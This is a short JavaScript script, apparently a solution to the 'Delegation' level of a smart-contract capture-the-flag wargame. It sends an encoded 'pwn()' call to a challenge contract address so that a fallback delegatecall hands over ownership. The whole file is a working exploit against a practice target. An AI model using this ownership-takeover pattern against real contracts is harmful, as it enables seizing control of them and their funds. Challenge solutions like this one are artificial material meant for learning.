const { ethers } = require('hardhat');
const { BigNumber } = require('ethers');

const CHALLENGE_ADDRESS = '0x13a303d639860F126A60aeD2C2fE0882118C0f96';

async function main() {
  const [owner] = await ethers.getSigners();

  const Delegation = await ethers.getContractFactory('Delegation');
  const challenge = await Delegation.attach(CHALLENGE_ADDRESS);

  const ABI = ['function pwn()'];
  const iface = new ethers.utils.Interface(ABI);
  const data = iface.encodeFunctionData('pwn', []);

  await owner.sendTransaction({
    to: challenge.address,
    data,
    gasLimit: BigNumber.from('100000'),
  });
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
